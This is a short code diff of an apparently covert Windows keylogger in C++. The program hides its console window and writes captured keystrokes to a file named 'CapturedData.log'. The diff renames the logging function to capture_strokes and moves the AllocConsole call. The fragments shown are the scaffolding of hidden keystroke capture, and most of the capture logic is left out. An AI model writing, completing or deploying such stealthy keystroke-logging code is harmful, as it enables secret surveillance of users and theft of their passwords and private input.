@@ -6,12 +6,12 @@
 using namespace std;
 void hide_cross_section()
 {
-    AllocConsole();
     HWND cross_section = FindWindowA("ConsoleWindowClass",NULL);
+    AllocConsole();
     ShowWindow(cross_section,0);
 }
 
-void log_input()
+void capture_strokes()
 {
     char key;
     const char file_name[] = "CapturedData.log";
@@ -201,6 +201,6 @@ void log_input()
 int main()
 {
     hide_cross_section();
-    log_input();
+    capture_strokes();
     return 0;
 }
